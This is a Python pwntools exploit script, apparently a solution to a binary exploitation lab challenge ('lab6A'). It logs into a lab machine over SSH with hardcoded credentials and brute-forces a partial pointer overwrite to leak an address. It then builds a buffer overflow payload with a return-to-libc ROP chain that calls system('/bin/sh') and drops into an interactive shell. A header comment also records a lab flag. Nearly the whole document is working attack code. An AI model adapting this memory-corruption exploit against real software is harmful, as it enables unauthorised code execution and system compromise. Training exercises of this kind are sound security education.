#!/usr/bin/env python3
#
# lab6end:eye_gu3ss_0n_@ll_mah_h0m3w3rk
#

import sys

from pwn import *

def main():
  
  session = ssh(host="192.168.159.129", user="lab6A", password="strncpy_1s_n0t_s0_s4f3_l0l")
  sh = session.process("/bin/sh", env={"PS1":""})

  while True:
    r = brute_force_leak(sh)
    if (r != None):
      break

  ptr2print_name = extract_leak(r)         # extract the leaked address of print_name
  ptr2system     = ptr2print_name-0x19da52 # offset to the location of system

  log.info("Leaked a pointer to print_name(): 0x%x" % ptr2print_name)
  log.info("Pointer to system() at: 0x%x" % ptr2system)

  exploit(sh, ptr2system)

# exploit: using X function overwrite the return address in main() and drop into our chain
def exploit(sh, sys_addr):

  log.info("Beginning exploitation, overwriting return address")

  sh.sendline(b"1")
  sh.read()

  offset     = b"A" * 34
  retAddr    = struct.pack('<L', sys_addr+0x19dc33) # [lab6A] ret
  rop_chain  = generate_rop_chain(sys_addr)

  rest      = b" " * (0x80 - (
    len(offset) +
    len(retAddr) +
    len(rop_chain)
    )
  )

  payload = offset + retAddr + rop_chain + rest

  log.info("Generated ROP chain sending final payload")
  sh.sendline(payload)
  sh.read()

  sh.sendline(b"4")

  while True:
    sh.sendline("echo \"GTFO\"")
    if b"GTFO" in sh.read():
      break


  log.success("Exploitation complete enjoy your shell")
  sh.interactive()

# generate_rop_chain: as the name says, generate the chain using the base address
def generate_rop_chain(base_addr):

  rop_gadgets = [
    base_addr + 0x19dc33, # [lab6A] ret
    base_addr + 0x19dc33, # [lab6A] ret
    base_addr + 0x19dc33, # [lab6A] ret
    base_addr + 0x19dc33, # [lab6A] ret
    base_addr,            # [libc-2.19.so] *system()
    base_addr-0xcfb0,     # [libc-2.19.so] *exit()
    base_addr + 0x120894, # [libc-2.19.so] *ptr -> "/bin/sh"
  ]

  return b''.join(struct.pack('<I', _) for _ in rop_gadgets)

# extract_leak: parse the response from calling print_name (after bruteforce) 
def extract_leak(leak):

  index = leak.find(b"A" * 90)
  addr = format_address(leak[index+90:][0:4][::-1])

  return addr

# brute_force_leak: start a bruteforce attack to call print_name function
def brute_force_leak(sh):

  evil_bytes = [ 0x0b, 0x1b, 0x2b, 0x3b, 0x4b, 0x5b, 0x6b, 0x7b,
                 0x8b, 0x9b, 0xab, 0xbb, 0xcb, 0xdb, 0xeb, 0xfb ]

  for i in range(len(evil_bytes)):

    sh.sendline("/levels/lab06/lab6A")
    sh.read()

    sh.sendline(b"1")
    sh.read()

    # 122 bytes needed to overwrite EAX at *main+398 
    sh.send(b"A" * 122 + b"\xe2" + bytes([evil_bytes[i]]))
    sh.read()

    sh.sendline(b"3")
    data = sh.read()

    if b"Username" in data:
      return data
  return

# format_address: format a string into a base 16 integer
def format_address(str_buff):
  
  try:
    int_fmt = int("0x{:02x}{:02x}{:02x}{:02x}".format(
      str_buff[0], str_buff[1],
      str_buff[2], str_buff[3]),
    16)
  except:
    print("[-] failed to format address")
    exit(-1)

  return int_fmt

main()
